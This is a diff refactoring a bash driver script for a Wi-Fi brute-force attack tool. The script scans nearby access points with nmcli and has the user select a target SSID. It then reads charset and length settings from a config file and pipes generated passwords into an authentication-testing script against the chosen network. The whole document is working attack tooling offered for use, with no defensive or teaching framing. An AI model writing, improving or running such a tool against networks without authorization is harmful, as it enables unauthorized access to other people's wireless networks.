@@ -2,62 +2,79 @@
 set -euo pipefail
 
 DIR="$(cd "$(dirname "$0")/.." && pwd)"
-INTERFACE="${1:-wlan0}"
+CONFIG="$DIR/config/settings.yml"
+INTERFACE="${1:-}"
 
-echo "[*] Scanning for access points on $INTERFACE ..."
-echo ""
+config_val() {
+    awk -F': *' -v key="$1" '$1 == key {
+        gsub(/^"|"$/, "", $2); print $2; exit
+    }' "$CONFIG" 2>/dev/null
+}
 
-SCAN_OUT=$("$DIR/scripts/scan_wifi.sh" "$INTERFACE" 2>&1)
+scan_aps() {
+    "$DIR/scripts/scan_wifi.sh" "$INTERFACE" 2>&1
+}
 
-if echo "$SCAN_OUT" | grep -qi "error\|not found\|no networks"; then
-    echo "$SCAN_OUT"
-    exit 1
-fi
-
-echo "$SCAN_OUT"
-echo ""
-
-# Extract SSIDs using raw nmcli -t format (handles spaces in SSID names)
-SSIDS=()
-if command -v nmcli &>/dev/null; then
-    while IFS=: read -r ssid signal enc; do
-        [ -n "$ssid" ] && SSIDS+=("$ssid")
-    done < <(nmcli -t -f SSID,SIGNAL dev wifi list 2>/dev/null)
-fi
-
-if [ ${#SSIDS[@]} -eq 0 ]; then
-    echo "[-] No access points found."
-    exit 1
-fi
-
-echo "[*] Select an access point (1-${#SSIDS[@]}):"
-select TARGET in "${SSIDS[@]}"; do
-    if [[ -n "$TARGET" ]]; then
-        echo ""
-        echo "[+] Selected: $TARGET"
-        break
-    else
-        echo "[-] Invalid selection, try again."
+select_ap() {
+    local ssids=()
+    if command -v nmcli &>/dev/null; then
+        while IFS=: read -r ssid _; do
+            [ -n "$ssid" ] && ssids+=("$ssid")
+        done < <(nmcli -t -f SSID dev wifi list 2>/dev/null)
     fi
-done
 
-read -r -p "[*] Charset preset [all]: " CHARSET
-CHARSET="${CHARSET:-all}"
+    if [ ${#ssids[@]} -eq 0 ]; then
+        echo "[-] No access points found." >&2
+        exit 1
+    fi
 
-read -r -p "[*] Min password length [8]: " MIN
-MIN="${MIN:-8}"
+    echo "[*] Select access point (1-${#ssids[@]}):" >&2
+    select TARGET in "${ssids[@]}"; do
+        if [[ -n "$TARGET" ]]; then
+            echo "[+] Selected: $TARGET" >&2
+            break
+        fi
+        echo "[-] Invalid selection, try again." >&2
+    done
+}
 
-read -r -p "[*] Max password length [8]: " MAX
-MAX="${MAX:-8}"
+get_prompt() {
+    local var=$1 label=$2 default=$3
+    local val
+    read -r -p "[*] $label [$default]: " val
+    printf '%s\n' "${val:-$default}"
+}
 
-read -r -p "[*] Limit attempts (0 = unlimited) [0]: " LIMIT
-LIMIT="${LIMIT:-0}"
+main() {
+    [[ -z "$INTERFACE" ]] && INTERFACE=$(config_val interface)
+    INTERFACE="${INTERFACE:-wlan0}"
 
-echo ""
-echo "[*] Starting brute-force attack on '$TARGET'"
-echo "[*] Charset: $CHARSET  |  Length: $MIN-$MAX  |  Limit: $LIMIT"
-echo "[*] $(date)"
-echo ""
+    echo "[*] Scanning on $INTERFACE ..." >&2
+    scan_aps
+    echo >&2
+    select_ap
 
-"$DIR/scripts/gen_passwords.py" --charset "$CHARSET" --min "$MIN" --max "$MAX" --limit "$LIMIT" | \
-    "$DIR/scripts/auth_test.py" --ssid "$TARGET" --interface "$INTERFACE" --limit "$LIMIT"
+    local def_charset def_min def_max def_limit
+    def_charset=$(config_val charset);    def_charset="${def_charset:-all}"
+    def_min=$(config_val min_length);     def_min="${def_min:-8}"
+    def_max=$(config_val max_length);     def_max="${def_max:-8}"
+    def_limit=0
+
+    CHARSET=$(get_prompt charset "Charset preset" "$def_charset")
+    MIN=$(get_prompt min "Min password length" "$def_min")
+    MAX=$(get_prompt max "Max password length" "$def_max")
+    LIMIT=$(get_prompt limit "Limit attempts (0 = unlimited)" "$def_limit")
+
+    echo >&2
+    echo "[*] Starting brute-force on '$TARGET'" >&2
+    echo "[*] Charset: $CHARSET  |  Length: $MIN-$MAX  |  Limit: $LIMIT" >&2
+    echo "[*] $(date)" >&2
+    echo >&2
+
+    "$DIR/scripts/gen_passwords.py" \
+        --charset "$CHARSET" --min "$MIN" --max "$MAX" --limit "$LIMIT" | \
+    "$DIR/scripts/auth_test.py" \
+        --ssid "$TARGET" --interface "$INTERFACE" --limit "$LIMIT"
+}
+
+main
